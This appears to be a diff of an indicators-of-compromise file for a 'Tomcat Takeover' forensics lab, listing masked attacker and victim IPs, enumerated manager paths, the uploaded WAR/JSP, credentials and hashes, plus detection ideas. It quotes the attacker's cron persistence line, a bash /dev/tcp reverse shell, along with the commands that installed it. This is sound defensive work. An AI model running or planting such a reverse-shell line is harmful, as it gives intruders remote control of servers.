@@ -1,44 +1,144 @@
-# Tomcat Takeover — IOCs
+# English IOCs — Tomcat Takeover Lab
 
-## Sources
+## IP addresses
 
-| Source | Usage |
+| IOC | Role | Comment |
+|---|---|---|
+| `**********` | Victim | Compromised Tomcat server |
+| `**********` | Attacker | Source of enumeration, WAR upload, and reverse shell |
+| `**********` | Likely legitimate client | Normal browsing observed before the attack |
+
+## Ports
+
+| Port | Role |
 |---|---|
-| CyberDefenders | Scenario and questions |
-| PCAP | Network evidence |
-| Wireshark | Stream analysis |
-| NetworkMiner | Additional network view |
+| `****` | Exposed Apache Tomcat service |
+| `**` | Initial reverse shell destination |
+| `***` | Port used by cron persistence |
+| `22` | SSH traffic observed after compromise |
 
-## Artifact Hashes
+## Web paths
 
-| Type | Value | Comment |
-|---|---|---|
-| MD5 | `9ab62c5a2a1f8d0030f8240355305e7` | PCAP file hash |
-| SHA256 | `9a8db2ec46186ff541f8f307544a5ceb07ce702f36d36fd8ae964bcb53f716` | PCAP file hash |
+```text
+/
+ /docs/
+/examples/
+/*******
+/*******/
+/*******/html
+/*******/html/upload
+/host-manager
+/admin
+/admin-console
+/status
+/webdav
+/******/
+```
 
-## Network
+## Files
 
-| Type | Value | Role | Comment |
-|---|---|---|---|
-| Attacker IP | To complete | Attack source | Responsible for scanning and suspicious requests |
-| Server IP | To complete | Target | Tomcat web server |
-| Admin port | To complete | Administration | Administration panel port |
+| File | Role |
+|---|---|
+| `******.***` | Uploaded malicious WAR archive |
+| `********.***` | Malicious JSP used for the reverse shell |
+| `WEB-INF/web.xml` | WAR application configuration |
+| `upload_raw.bin` | Raw data extracted from the upload POST request |
+| `reverse_shell_stream_****.txt` | ASCII TCP stream of the reverse shell |
+| `tomcat_takeover_findings.md` | Summary report |
+| `hashes_sha256.txt` | SHA256 hashes of evidence files |
 
-## HTTP
+## Suspicious User-Agent
 
-| Type | Value | Comment |
-|---|---|---|
-| Admin directory | To complete | Directory discovered after enumeration |
-| Tool User-Agent | To complete | Identified enumeration tool |
-| Credentials | To mask | Credentials successfully used |
-| Uploaded file | To complete | Uploaded malicious file |
+```text
+************
+```
 
-## Provisional MITRE ATT&CK
+## Observed credentials
 
-| Tactic | Technique | ID | Comment |
-|---|---|---|---|
-| Reconnaissance | Active Scanning | T1595 | Port scanning observed |
-| Discovery | File and Directory Discovery | T1083 | Directory enumeration |
-| Credential Access | Brute Force | T1110 | Login attempts |
-| Initial Access | Exploit Public-Facing Application | T1190 | Compromise of exposed web service |
-| Persistence | Scheduled Task/Job | T1053 | Scheduled persistence to confirm |
+Tested credentials:
+
+```text
+*****:*****
+******:******
+admin:
+*****:******
+******:******
+*****:******
+```
+
+Valid credentials:
+
+```text
+*****:******
+```
+
+## Reverse shell
+
+```text
+tcp.stream == ****
+**********:***** -> **********:80
+```
+
+## Persistence
+
+```cron
+* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'
+```
+
+## Observed commands
+
+```bash
+whoami
+cd /tmp
+pwd
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'" > cron
+crontab -i cron
+crontab -l
+```
+
+## SHA256 hashes
+
+```text
+b0f9ed31b467a45f2ec77338b1b17fb455463423eb70593a4a64cb969c0de188  evidence/******.***
+bc06cf70994c655b3f558c820c570e43b7dc52b990e11a10b6856d19b84c5e41  evidence/upload_raw.bin
+88a7b5d5ebfbed35e86cddac74893685252c762bdc152942a57e0809e0e9bfad  evidence/reverse_shell_stream_****.txt
+6838dd4e167551f7910d2ce6ef23aeaf4f325c897cd5f1d70ee00492d8ceb1c0  evidence/tomcat_takeover_findings.md
+bc4900bad640e4937eb70575de02bea6541130e478d2c50d4cc4b2ca4dad4d22  evidence/extracted_war/********.***
+3c309168f34178227b65c752ff563db78d769c7c389a6c822a97523d575584a3  evidence/extracted_war/WEB-INF/web.xml
+```
+
+## Possible detection logic
+
+### HTTP detection
+
+Look for:
+
+```text
+User-Agent contains ********
+URI contains /*******
+URI contains /*******/html/upload
+URI contains /******/
+POST request to /*******/html/upload
+```
+
+### Network detection
+
+Look for:
+
+```text
+Outbound connection from a Tomcat server to an unexpected IP
+Outbound connection to port 80 or 443 after a WAR upload
+Interactive stream with frequent small packets
+```
+
+### Host detection
+
+Look for:
+
+```text
+New WAR file deployed
+Unknown JSP file created
+Crontab modification
+Bash command using /dev/tcp/
+Runtime.getRuntime().exec inside a JSP
+```
